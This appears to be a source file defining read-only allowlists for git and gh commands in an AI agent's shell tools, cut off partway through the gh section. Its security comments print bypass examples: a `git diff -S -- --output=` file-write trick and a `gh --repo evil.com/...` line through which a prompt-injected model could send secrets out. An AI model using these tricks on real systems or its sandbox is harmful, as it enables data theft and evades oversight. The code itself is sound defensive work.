/**
 * shell 工具（BashTool、PowerShellTool 等）的共享命令验证映射。
 *
 * 导出完整的命令配置映射，任何 shell 工具都可以导入：
 * - GIT_READ_ONLY_COMMANDS：所有 git 子命令及其安全标志和回调
 * - GH_READ_ONLY_COMMANDS：仅限 ant 的 gh CLI 命令（依赖网络）
 * - EXTERNAL_READONLY_COMMANDS：在 bash 和 PowerShell 中都适用的跨 shell 命令
 * - containsVulnerableUncPath：用于凭据泄露防护的 UNC 路径检测
 * - outputLimits 在 outputLimits.ts 中
 */

import { getPlatform } from '../../services/shell/platform.js'

// ---------------------------------------------------------------------------
// 类型定义
// ---------------------------------------------------------------------------

export type FlagArgType =
  | 'none' // 无参数 (--color, -n)
  | 'number' // 整数参数 (--context=3)
  | 'string' // 任意字符串参数 (--relative=path)
  | 'char' // 单个字符（分隔符）
  | '{}' // 仅限字面量 "{}"
  | 'EOF' // 仅限字面量 "EOF"

export type ExternalCommandConfig = {
  safeFlags: Record<string, FlagArgType>
  // 返回 true 表示命令危险，返回 false 表示安全。
  // args 是命令名之后的标记列表（例如 "git branch" 之后的部分）。
  additionalCommandIsDangerousCallback?: (rawCommand: string, args: string[]) => boolean
  // 当为 false 时，该工具不遵循 POSIX `--` 选项结束符。
  // validateFlags 将在 `--` 之后继续检查标志，而非中断。
  // 默认值：true（大多数工具遵循 `--`）。
  respectsDoubleDash?: boolean
}

// ---------------------------------------------------------------------------
// 共享的 git 标志组
// ---------------------------------------------------------------------------

const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
  '--all': 'none',
  '--branches': 'none',
  '--tags': 'none',
  '--remotes': 'none',
}

const GIT_DATE_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--since': 'string',
  '--after': 'string',
  '--until': 'string',
  '--before': 'string',
}

const GIT_LOG_DISPLAY_FLAGS: Record<string, FlagArgType> = {
  '--oneline': 'none',
  '--graph': 'none',
  '--decorate': 'none',
  '--no-decorate': 'none',
  '--date': 'string',
  '--relative-date': 'none',
}

const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
  '--max-count': 'number',
  '-n': 'number',
}

// 统计输出标志 - 用于 git log、show、diff
const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
  '--stat': 'none',
  '--numstat': 'none',
  '--shortstat': 'none',
  '--name-only': 'none',
  '--name-status': 'none',
}

// 颜色输出标志 - 用于 git log、show、diff
const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
  '--color': 'none',
  '--no-color': 'none',
}

// 补丁显示标志 - 用于 git log、show
const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
  '--patch': 'none',
  '-p': 'none',
  '--no-patch': 'none',
  '--no-ext-diff': 'none',
  '-s': 'none',
}

// 作者/提交者过滤标志 - 用于 git log、reflog
const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--author': 'string',
  '--committer': 'string',
  '--grep': 'string',
}

// ---------------------------------------------------------------------------
// GIT_READ_ONLY_COMMANDS — 所有 git 子命令的完整映射
// ---------------------------------------------------------------------------

export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  'git diff': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      // 显示和比较标志
      '--dirstat': 'none',
      '--summary': 'none',
      '--patch-with-stat': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--no-renames': 'none',
      '--no-ext-diff': 'none',
      '--check': 'none',
      '--ws-error-highlight': 'string',
      '--full-index': 'none',
      '--binary': 'none',
      '--abbrev': 'number',
      '--break-rewrites': 'none',
      '--find-renames': 'none',
      '--find-copies': 'none',
      '--find-copies-harder': 'none',
      '--irreversible-delete': 'none',
      '--diff-algorithm': 'string',
      '--histogram': 'none',
      '--patience': 'none',
      '--minimal': 'none',
      '--ignore-space-at-eol': 'none',
      '--ignore-space-change': 'none',
      '--ignore-all-space': 'none',
      '--ignore-blank-lines': 'none',
      '--inter-hunk-context': 'number',
      '--function-context': 'none',
      '--exit-code': 'none',
      '--quiet': 'none',
      '--cached': 'none',
      '--staged': 'none',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
      '--no-index': 'none',
      '--relative': 'string',
      // diff 过滤
      '--diff-filter': 'string',
      // 短标志
      '-p': 'none',
      '-u': 'none',
      '-s': 'none',
      '-M': 'none',
      '-C': 'none',
      '-B': 'none',
      '-D': 'none',
      '-l': 'none',
      // 安全说明：-S/-G/-O 需要必填的字符串参数（pickaxe 搜索、
      // pickaxe 正则、排序文件）。之前设为 'none' 导致与 git 的解析器
      // 差异：`git diff -S -- --output=/tmp/pwned` — 验证器认为 -S 无参数
      // → 前进 1 个标记 → 在 `--` 处中断 → --output 未被检查。git 认为
      // -S 需要参数 → 消耗 `--` 作为 pickaxe 字符串（标准 getopt：
      // 必填参数选项无条件消耗下一个 argv，在顶层 `--` 检查之前）→ 光标
      // 到 --output=... → 解析为长选项 → 任意文件写入。
      // 第 ~207 行的 git log 配置正确地将 -S/-G 设为 'string'。
      '-S': 'string',
      '-G': 'string',
      '-O': 'string',
      '-R': 'none',
    },
  },
  'git log': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // 额外的显示标志
      '--abbrev-commit': 'none',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--simplify-merges': 'none',
      '--ancestry-path': 'none',
      '--source': 'none',
      '--first-parent': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--reverse': 'none',
      '--walk-reflogs': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--follow': 'none',
      // 提交遍历标志
      '--no-walk': 'none',
      '--left-right': 'none',
      '--cherry-mark': 'none',
      '--cherry-pick': 'none',
      '--boundary': 'none',
      // 排序标志
      '--topo-order': 'none',
      '--date-order': 'none',
      '--author-date-order': 'none',
      // 格式控制
      '--pretty': 'string',
      '--format': 'string',
      // diff 过滤
      '--diff-filter': 'string',
      // pickaxe 搜索（查找添加/删除字符串的提交）
      '-S': 'string',
      '-G': 'string',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
    },
  },
  'git show': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // 额外的显示标志
      '--abbrev-commit': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--first-parent': 'none',
      '--raw': 'none',
      // diff 过滤
      '--diff-filter': 'string',
      // 短标志
      '-m': 'none',
      '--quiet': 'none',
    },
  },
  'git shortlog': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      // 摘要选项
      '-s': 'none',
      '--summary': 'none',
      '-n': 'none',
      '--numbered': 'none',
      '-e': 'none',
      '--email': 'none',
      '-c': 'none',
      '--committer': 'none',
      // 分组
      '--group': 'string',
      // 格式化
      '--format': 'string',
      // 过滤
      '--no-merges': 'none',
      '--author': 'string',
    },
  },
  'git reflog': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
    },
    // 安全说明：阻止 `git reflog expire`（位置子命令）— 它通过使 reflog
    // 条目过期来写入 .git/logs/**。`git reflog delete` 同样会写入。
    // 只有 `git reflog`（裸命令 = show）和 `git reflog show` 是安全的。
    // 如果没有此检查，~:1730 处的位置参数穿透会接受 `expire` 作为
    // 非标志参数，且 `--all` 在 GIT_REF_SELECTION_FLAGS 中 → 通过。
    additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
      // 阻止已知的可写子命令：expire、delete、exists。
      // 允许：`show`、引用名（HEAD、refs/*、分支名）。
      // 子命令（如果有）是第一个位置参数。`show` 之后或标志之后的
      // 位置参数是引用名（安全）。
      const DANGEROUS_SUBCOMMANDS = new Set(['expire', 'delete', 'exists'])
      for (const token of args) {
        if (!token || token.startsWith('-')) {
          continue
        }
        // 第一个非标志位置参数：检查是否为危险子命令。
        // 如果是 `show` 或类似 `HEAD`/`refs/...` 的引用名，则安全。
        if (DANGEROUS_SUBCOMMANDS.has(token)) {
          return true // 危险子命令 — 写入 .git/logs/**
        }
        // 第一个位置参数安全（show/HEAD/ref）— 后续是引用参数
        return false
      }
      return false // 无位置参数 = 裸 `git reflog` = 安全（显示 reflog）
    },
  },
  'git stash list': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_COUNT_FLAGS,
    },
  },
  'git ls-remote': {
    safeFlags: {
      // 分支/标签过滤标志
      '--branches': 'none',
      '-b': 'none',
      '--tags': 'none',
      '-t': 'none',
      '--heads': 'none',
      '-h': 'none',
      '--refs': 'none',
      // 输出控制标志
      '--quiet': 'none',
      '-q': 'none',
      '--exit-code': 'none',
      '--get-url': 'none',
      '--symref': 'none',
      // 排序标志
      '--sort': 'string',
      // 协议标志
      // 安全说明：--server-option 和 -o 被故意排除。它们会将攻击者
      // 控制的任意字符串通过 protocol v2 能力通告传输到远程 git 服务器。
      // 这是本应为只读命令上的网络写入原语（向远程发送数据）。
      // 即使没有命令替换（在其他地方被捕获），
      // `--server-option="sensitive-data"` 也会将值泄露到 `origin` 指向的
      // 任何地方。只读路径永远不应启用网络写入。
    },
  },
  'git status': {
    safeFlags: {
      // 输出格式标志
      '--short': 'none',
      '-s': 'none',
      '--branch': 'none',
      '-b': 'none',
      '--porcelain': 'none',
      '--long': 'none',
      '--verbose': 'none',
      '-v': 'none',
      // 未跟踪文件处理
      '--untracked-files': 'string',
      '-u': 'string',
      // 忽略选项
      '--ignored': 'none',
      '--ignore-submodules': 'string',
      // 列显示
      '--column': 'none',
      '--no-column': 'none',
      // 领先/落后信息
      '--ahead-behind': 'none',
      '--no-ahead-behind': 'none',
      // 重命名检测
      '--renames': 'none',
      '--no-renames': 'none',
      '--find-renames': 'string',
      '-M': 'string',
    },
  },
  'git blame': {
    safeFlags: {
      ...GIT_COLOR_FLAGS,
      // 行范围
      '-L': 'string',
      // 输出格式
      '--porcelain': 'none',
      '-p': 'none',
      '--line-porcelain': 'none',
      '--incremental': 'none',
      '--root': 'none',
      '--show-stats': 'none',
      '--show-name': 'none',
      '--show-number': 'none',
      '-n': 'none',
      '--show-email': 'none',
      '-e': 'none',
      '-f': 'none',
      // 日期格式化
      '--date': 'string',
      // 忽略空白
      '-w': 'none',
      // 忽略修订
      '--ignore-rev': 'string',
      '--ignore-revs-file': 'string',
      // 移动/复制检测
      '-M': 'none',
      '-C': 'none',
      '--score-debug': 'none',
      // 缩写
      '--abbrev': 'number',
      // 其他选项
      '-s': 'none',
      '-l': 'none',
      '-t': 'none',
    },
  },
  'git ls-files': {
    safeFlags: {
      // 文件选择
      '--cached': 'none',
      '-c': 'none',
      '--deleted': 'none',
      '-d': 'none',
      '--modified': 'none',
      '-m': 'none',
      '--others': 'none',
      '-o': 'none',
      '--ignored': 'none',
      '-i': 'none',
      '--stage': 'none',
      '-s': 'none',
      '--killed': 'none',
      '-k': 'none',
      '--unmerged': 'none',
      '-u': 'none',
      // 输出格式
      '--directory': 'none',
      '--no-empty-directory': 'none',
      '--eol': 'none',
      '--full-name': 'none',
      '--abbrev': 'number',
      '--debug': 'none',
      '-z': 'none',
      '-t': 'none',
      '-v': 'none',
      '-f': 'none',
      // 排除模式
      '--exclude': 'string',
      '-x': 'string',
      '--exclude-from': 'string',
      '-X': 'string',
      '--exclude-per-directory': 'string',
      '--exclude-standard': 'none',
      // 错误处理
      '--error-unmatch': 'none',
      // 递归
      '--recurse-submodules': 'none',
    },
  },
  'git config --get': {
    safeFlags: {
      // 无需额外标志 - 只是读取配置值
      '--local': 'none',
      '--global': 'none',
      '--system': 'none',
      '--worktree': 'none',
      '--default': 'string',
      '--type': 'string',
      '--bool': 'none',
      '--int': 'none',
      '--bool-or-int': 'none',
      '--path': 'none',
      '--expiry-date': 'none',
      '-z': 'none',
      '--null': 'none',
      '--name-only': 'none',
      '--show-origin': 'none',
      '--show-scope': 'none',
    },
  },
  // 注意：'git remote show' 必须在 'git remote' 之前，以便先匹配更长的模式
  'git remote show': {
    safeFlags: {
      '-n': 'none',
    },
    // 仅允许可选的 -n，然后是一个字母数字的远程名称
    additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
      // 过滤掉已知的安全标志
      const positional = args.filter((a) => a !== '-n')
      // 必须恰好有一个看起来像远程名称的位置参数
      if (positional.length !== 1) {
        return true
      }
      return !/^[a-zA-Z0-9_-]+$/.test(positional[0]!)
    },
  },
  'git remote': {
    safeFlags: {
      '-v': 'none',
      '--verbose': 'none',
    },
    // 仅允许裸 'git remote' 或 'git remote -v/--verbose'
    additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
      // 所有参数必须是已知的安全标志；不允许位置参数
      return args.some((a) => a !== '-v' && a !== '--verbose')
    },
  },
  // git merge-base 是查找公共祖先的只读命令
  'git merge-base': {
    safeFlags: {
      '--is-ancestor': 'none', // 检查第一个提交是否是第二个的祖先
      '--fork-point': 'none', // 查找分叉点
      '--octopus': 'none', // 为多个引用查找最佳公共祖先
      '--independent': 'none', // 过滤独立引用
      '--all': 'none', // 输出所有合并基
    },
  },
  // git rev-parse 是纯只读命令 — 将引用解析为 SHA，查询仓库路径
  'git rev-parse': {
    safeFlags: {
      // SHA 解析和验证
      '--verify': 'none', // 验证恰好一个参数是有效的对象名
      '--short': 'string', // 缩写输出（可选长度通过 =N 指定）
      '--abbrev-ref': 'none', // 引用的符号名
      '--symbolic': 'none', // 输出符号名
      '--symbolic-full-name': 'none', // 完整符号名，包含 refs/heads/ 前缀
      // 仓库路径查询（全部只读）
      '--show-toplevel': 'none', // 顶层目录的绝对路径
      '--show-cdup': 'none', // 向上遍历到顶层的路径组件
      '--show-prefix': 'none', // 从顶层到 cwd 的相对路径
      '--git-dir': 'none', // .git 目录的路径
      '--git-common-dir': 'none', // 公共目录的路径（主工作树中的 .git）
      '--absolute-git-dir': 'none', // .git 目录的绝对路径
      '--show-superproject-working-tree': 'none', // 超级项目根目录（如果是子模块）
      // 布尔查询
      '--is-inside-work-tree': 'none',
      '--is-inside-git-dir': 'none',
      '--is-bare-repository': 'none',
      '--is-shallow-repository': 'none',
      '--is-shallow-update': 'none',
      '--path-prefix': 'none',
    },
  },
  // git rev-list 是只读的提交枚举 — 列出/统计从引用可达的提交
  'git rev-list': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // 计数
      '--count': 'none', // 输出提交数而非列表
      // 遍历控制
      '--reverse': 'none',
      '--first-parent': 'none',
      '--ancestry-path': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--min-parents': 'number',
      '--max-parents': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--walk-reflogs': 'none',
      // 输出格式化
      '--oneline': 'none',
      '--abbrev-commit': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--abbrev': 'number',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--source': 'none',
      '--graph': 'none',
    },
  },
  // git describe 是只读的 — 描述相对于最近标签的提交
  'git describe': {
    safeFlags: {
      // 标签选择
      '--tags': 'none', // 考虑所有标签，不仅仅是注释标签
      '--match': 'string', // 仅考虑匹配 glob 模式的标签
      '--exclude': 'string', // 不考虑匹配 glob 模式的标签
      // 输出控制
      '--long': 'none', // 始终输出长格式（tag-distance-ghash）
      '--abbrev': 'number', // 将对象名缩写为 N 个十六进制数字
      '--always': 'none', // 作为后备显示唯一缩写的对象
      '--contains': 'none', // 查找提交之后的标签
      '--first-match': 'none', // 优先选择最接近顶端的标签（第一个匹配后停止）
      '--exact-match': 'none', // 仅在精确匹配时输出（标签指向提交）
      '--candidates': 'number', // 选择最佳候选前限制遍历
      // 后缀/脏标记
      '--dirty': 'none', // 如果工作树有修改则追加 "-dirty"
      '--broken': 'none', // 如果仓库处于无效状态则追加 "-broken"
    },
  },
  // git cat-file 是只读的对象检查 — 显示对象的类型、大小或内容
  // 注意：--batch（不含 --check）被故意排除 — 它从 stdin 读取任意对象，
  // 可能在管道命令中被利用来转储敏感对象。
  'git cat-file': {
    safeFlags: {
      // 对象查询模式（全部纯只读）
      '-t': 'none', // 打印对象类型
      '-s': 'none', // 打印对象大小
      '-p': 'none', // 美观打印对象内容
      '-e': 'none', // 对象存在则以零退出，否则非零
      // 批处理模式 — 仅只读检查变体
      '--batch-check': 'none', // 对 stdin 上的每个对象，打印类型和大小（无内容）
      // 输出控制
      '--allow-undetermined-type': 'none',
    },
  },
  // git for-each-ref 是只读的引用迭代 — 列出带有可选格式化和过滤的引用
  'git for-each-ref': {
    safeFlags: {
      // 输出格式化
      '--format': 'string', // 使用 %(fieldname) 占位符的格式字符串
      // 排序
      '--sort': 'string', // 按键排序（如 refname、creatordate、version:refname）
      // 限制
      '--count': 'number', // 限制输出最多 N 个引用
      // 过滤
      '--contains': 'string', // 仅列出包含指定提交的引用
      '--no-contains': 'string', // 仅列出不包含指定提交的引用
      '--merged': 'string', // 仅列出从指定提交可达的引用
      '--no-merged': 'string', // 仅列出从指定提交不可达的引用
      '--points-at': 'string', // 仅列出指向指定对象的引用
    },
  },
  // git grep 是只读的 — 在跟踪的文件中搜索模式
  'git grep': {
    safeFlags: {
      // 模式匹配模式
      '-e': 'string', // 模式
      '-E': 'none', // 扩展正则
      '--extended-regexp': 'none',
      '-G': 'none', // 基本正则（默认）
      '--basic-regexp': 'none',
      '-F': 'none', // 固定字符串
      '--fixed-strings': 'none',
      '-P': 'none', // Perl 正则
      '--perl-regexp': 'none',
      // 匹配控制
      '-i': 'none', // 忽略大小写
      '--ignore-case': 'none',
      '-v': 'none', // 反向匹配
      '--invert-match': 'none',
      '-w': 'none', // 词正则
      '--word-regexp': 'none',
      // 输出控制
      '-n': 'none', // 行号
      '--line-number': 'none',
      '-c': 'none', // 计数
      '--count': 'none',
      '-l': 'none', // 匹配的文件
      '--files-with-matches': 'none',
      '-L': 'none', // 不匹配的文件
      '--files-without-match': 'none',
      '-h': 'none', // 无文件名
      '-H': 'none', // 含文件名
      '--heading': 'none',
      '--break': 'none',
      '--full-name': 'none',
      '--color': 'none',
      '--no-color': 'none',
      '-o': 'none', // 仅匹配部分
      '--only-matching': 'none',
      // 上下文
      '-A': 'number', // 后文
      '--after-context': 'number',
      '-B': 'number', // 前文
      '--before-context': 'number',
      '-C': 'number', // 上下文
      '--context': 'number',
      // 多模式布尔运算符
      '--and': 'none',
      '--or': 'none',
      '--not': 'none',
      // 作用域控制
      '--max-depth': 'number',
      '--untracked': 'none',
      '--no-index': 'none',
      '--recurse-submodules': 'none',
      '--cached': 'none',
      // 线程
      '--threads': 'number',
      // 静默
      '-q': 'none',
      '--quiet': 'none',
    },
  },
  // git stash show 是只读的 — 显示储藏条目的 diff
  'git stash show': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // diff 选项
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--diff-filter': 'string',
      '--abbrev': 'number',
    },
  },
  // git worktree list 是只读的 — 列出关联的工作树
  'git worktree list': {
    safeFlags: {
      '--porcelain': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--expire': 'string',
    },
  },
  'git tag': {
    safeFlags: {
      // 列表模式标志
      '-l': 'none',
      '--list': 'none',
      '-n': 'number',
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'string',
      '--no-merged': 'string',
      '--sort': 'string',
      '--format': 'string',
      '--points-at': 'string',
      '--column': 'none',
      '--no-column': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // 安全说明：通过位置参数阻止标签创建。`git tag foo` 创建
    // .git/refs/tags/foo（41 字节文件写入）— 不是只读操作。
    // 这与 `git branch foo`（下面有相同的回调）语义相同。如果没有此回调，
    // validateFlags 在 ~:1730 处的默认位置参数穿透会接受 `mytag` 作为
    // 非标志参数，git tag 会自动批准。虽然写入是受限的（路径限于
    // .git/refs/tags/，内容是固定的 HEAD SHA），但它违反了只读不变量，
    // 可能污染 CI/CD 标签模式匹配或通过 `git tag foo <commit>` 使
    // 废弃提交可达。
    additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
      // 安全用法：`git tag`（列表）、`git tag -l pattern`（过滤列表）、
      // `git tag --contains <ref>`（包含列表）。没有 -l/--list 的裸位置
      // 参数是要创建的标签名 — 危险。
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--merged',
        '--no-merged',
        '--points-at',
        '--sort',
        '--format',
        '-n',
      ])
      let i = 0
      let seenListFlag = false
      let seenDashDash = false
      while (i < args.length) {
        const token = args[i]
        if (!token) {
          i++
          continue
        }
        // `--` 结束标志解析。之后所有标记都是位置参数，
        // 即使以 `-` 开头。`git tag -- -l` 会创建名为 `-l` 的标签。
        if (token === '--' && !seenDashDash) {
          seenDashDash = true
          i++
          continue
        }
        if (!seenDashDash && token.startsWith('-')) {
          // 检查 -l/--list（精确匹配或在组合中）。`-li` 组合了 -l 和
          // -i — 都是 'none' 类型。Array.includes('-l') 精确匹配，会遗漏
          // 像 `-li`、`-il` 这样的组合。检查短组合中的单个字符。
          if (token === '--list' || token === '-l') {
            seenListFlag = true
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            // 像 -li、-il 这样包含 'l' 的短标志组合
            seenListFlag = true
          }
          if (token.includes('=')) {
            i++
          } else if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          // 非标志位置参数（或 `--` 之后的位置参数）。仅在前面有
          // -l/--list 时安全（那么它是模式，不是标签名）。
          if (!seenListFlag) {
            return true // 无 --list 的位置参数 = 创建标签
          }
          i++
        }
      }
      return false
    },
  },
  'git branch': {
    safeFlags: {
      // 列表模式标志
      '-l': 'none',
      '--list': 'none',
      '-a': 'none',
      '--all': 'none',
      '-r': 'none',
      '--remotes': 'none',
      '-v': 'none',
      '-vv': 'none',
      '--verbose': 'none',
      // 显示选项
      '--color': 'none',
      '--no-color': 'none',
      '--column': 'none',
      '--no-column': 'none',
      // 安全说明：--abbrev 保持 'number' 使 validateFlags 接受 --abbrev=N
      // （附加形式，安全）。分离形式 `--abbrev N` 才是 bug：
      // git 使用 PARSE_OPT_OPTARG（仅可选附加）— 分离的 N 变成
      // 位置分支名，创建 .git/refs/heads/N。validateFlags
      // 使用 'number' 消耗 N，但下面的回调捕获它：--abbrev
      // 不在回调的 flagsWithArgs 中（已移除），所以回调看到 N 作为
      // 无列表标志的位置参数 → 危险。两层防御：validateFlags
      // 接受两种形式，回调阻止分离形式。
      '--abbrev': 'number',
      '--no-abbrev': 'none',
      // 过滤 - 这些接受提交/引用参数
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'none', // 可选的提交参数 - 在回调中处理
      '--no-merged': 'none', // 可选的提交参数 - 在回调中处理
      '--points-at': 'string',
      // 排序
      '--sort': 'string',
      // 注意：--format 被故意排除，因为它可能带来安全风险
      // 显示当前分支
      '--show-current': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // 通过位置参数阻止分支创建（如 "git branch newbranch"）
    // 标志验证由上面的 safeFlags 处理
    // args 是 "git branch" 之后的标记
    additionalCommandIsDangerousCallback: (_rawCommand: string, args: string[]) => {
      // 阻止分支创建："git branch <name>" 或 "git branch <name> <start-point>"
      // 安全用法仅为："git branch"（列表）、"git branch -flags"（带选项的列表）、
      // 或 "git branch --contains/--merged/etc <ref>"（过滤）
      // 需要参数的标志
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--points-at',
        '--sort',
        // --abbrev 已移除：git 不消耗分离参数（PARSE_OPT_OPTARG）
      ])
      // 带可选参数的标志（不要求，但可以接受一个）
      const flagsWithOptionalArgs = new Set(['--merged', '--no-merged'])
      let i = 0
      let lastFlag = ''
      let seenListFlag = false
      let seenDashDash = false
      while (i < args.length) {
        const token = args[i]
        if (!token) {
          i++
          continue
        }
        // `--` 结束标志解析。`git branch -- -l` 会创建名为 `-l` 的分支。
        if (token === '--' && !seenDashDash) {
          seenDashDash = true
          lastFlag = ''
          i++
          continue
        }
        if (!seenDashDash && token.startsWith('-')) {
          // 检查 -l/--list 包括短标志组合（-li、-la 等）
          if (token === '--list' || token === '-l') {
            seenListFlag = true
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            seenListFlag = true
          }
          if (token.includes('=')) {
            lastFlag = token.split('=')[0] || ''
            i++
          } else if (flagsWithArgs.has(token)) {
            lastFlag = token
            i += 2
          } else {
            lastFlag = token
            i++
          }
        } else {
          // 非标志参数（或 `--` 之后的位置参数）- 可能是：
          // 1. 分支名（危险 - 创建分支）
          // 2. --list/-l 之后的模式（安全）
          // 3. --merged/--no-merged 之后的可选参数（安全）
          const lastFlagHasOptionalArg = flagsWithOptionalArgs.has(lastFlag)
          if (!seenListFlag && !lastFlagHasOptionalArg) {
            return true // 无 --list 或过滤标志的位置参数 = 创建分支
          }
          i++
        }
      }
      return false
    },
  },
}

// ---------------------------------------------------------------------------
// GH_READ_ONLY_COMMANDS — 仅限 ant 的 gh CLI 命令（依赖网络）
// ---------------------------------------------------------------------------

// 安全说明：所有 gh 命令的共享回调，防止网络数据外泄。
// gh 的 repo 参数接受 `[HOST/]OWNER/REPO` — 当 HOST 存在时
// （3 段），gh 连接到该主机的 API。被注入提示的模型可以
// 将密钥编码为 OWNER 段并通过 DNS/HTTP 外泄：
//   gh pr view 1 --repo evil.com/BASE32SECRET/x
//   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
// gh 也接受位置 URL：`gh pr view https://evil.com/owner/repo/pull/1`
//
// git ls-remote 有内联 URL 守卫（readOnlyValidation.ts:~944）；此
// 回调为 gh 提供等效功能。拒绝：
//   - 任何含 2+ 斜杠的标记（HOST/OWNER/REPO 格式 — 正常是 OWNER/REPO）
//   - 任何含 `://` 的标记（URL）
//   - 任何含 `@` 的标记（SSH 风格）
// 这涵盖 --repo 值和位置 URL/repo 参数，包括
// 等号附加形式 `--repo=HOST/OWNER/REPO`（cobra 接受两种形式）。
function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
  for (const token of args) {
    if (!token) {
      continue
    }
    // 对于标志标记，提取 `=` 之后的值进行检查。否则
    // `--repo=evil.com/SECRET/x`（以 `-` 开头的单个标记）会被完全跳过，
    // 绕过 HOST 检查。Cobra 将 `--flag=val` 和 `--flag val` 同等对待；
    // 我们必须检查两种形式。
    let value = token
    if (token.startsWith('-')) {
      const eqIdx = token.indexOf('=')
      if (eqIdx === -1) {
        continue // 无内联值的标志，无需检查
      }
      value = token.slice(eqIdx + 1)
      if (!value) {
        continue
      }
    }
    // 跳过明显不是 repo 规格的值（完全没有 `/`，或纯数字）
    if (!value.includes('/') && !value.includes('://') && !value.includes('@')) {
      continue
    }
    // URL 协议：https://、http://、git://、ssh://
    if (value.includes('://')) {
      return true
    }
    // SSH 风格：git@host:owner/repo
    if (value.includes('@')) {
      return true
    }
    // 3+ 段 = HOST/OWNER/REPO（正常 gh 格式是 OWNER/REPO，1 个斜杠）
    // 计数斜杠：2+ 个斜杠意味着 3+ 段
    const slashCount = (value.match(/\//g) || []).length
    if (slashCount >= 2) {
      return true
    }
  }
  return false
}

export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  // gh pr view 是只读的 — 显示拉取请求详情
  'gh pr view': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--comments': 'none', // 显示评论
      '--repo': 'string', // 目标仓库（OWNER/REPO）
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr list 是只读的 — 列出拉取请求
  'gh pr list': {
    safeFlags: {
      '--state': 'string', // open、closed、merged、all
      '-s': 'string',
      '--author': 'string',
      '--assignee': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--base': 'string',
      '--head': 'string',
      '--search': 'string',
      '--json': 'string',
      '--draft': 'none',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr diff 是只读的 — 显示拉取请求 diff
  'gh pr diff': {
    safeFlags: {
      '--color': 'string',
      '--name-only': 'none',
      '--patch': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr checks 是只读的 — 显示 CI 状态检查
  'gh pr checks': {
    safeFlags: {
      '--watch': 'none',
      '--required': 'none',
      '--fail-fast': 'none',
      '--json': 'string',
      '--interval': 'number',
      '--repo': 'string',
      '-R': 'string',
    },
